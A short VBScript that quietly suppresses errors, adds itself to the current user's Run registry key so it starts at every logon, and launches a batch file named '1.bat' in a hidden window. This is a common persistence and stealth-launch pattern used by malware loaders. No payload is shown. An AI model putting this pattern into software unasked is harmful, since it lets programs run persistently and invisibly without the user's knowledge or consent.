On Error Resume Next

NameScript = WScript.ScriptFullName
Set WshShell = WScript.CreateObject("WScript.Shell")


RegScript = WshShell.RegRead("HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyScript")
AddReg = True
If Err.Number <> 0 Then
    Err.Clear
ElseIf RegScript = NameScript Then
    AddReg = False
End If


If AddReg Then
    WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyScript", NameScript, "REG_SZ"
End If


WshShell.Run chr(34) & "1.bat" & chr(34), 0

Set WshShell = Nothing
